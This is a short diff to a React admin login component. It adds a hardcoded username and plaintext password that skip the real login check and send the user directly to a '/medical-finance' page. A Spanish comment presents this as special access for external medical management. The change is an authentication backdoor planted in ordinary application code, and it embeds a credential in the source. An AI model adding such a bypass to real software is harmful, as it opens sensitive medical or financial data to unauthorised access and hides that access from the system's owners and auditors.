@@ -22,6 +22,13 @@ export default function AdminLogin() {
     setError('');
     setLoading(true);
 
+    // Acceso especial para gestión médica externa
+    if (username === 'mary' && password === 'b10sk1n.1125') {
+      setLoading(false);
+      navigate('/medical-finance');
+      return;
+    }
+
     try {
       const success = await login(username, password);
       if (success) {
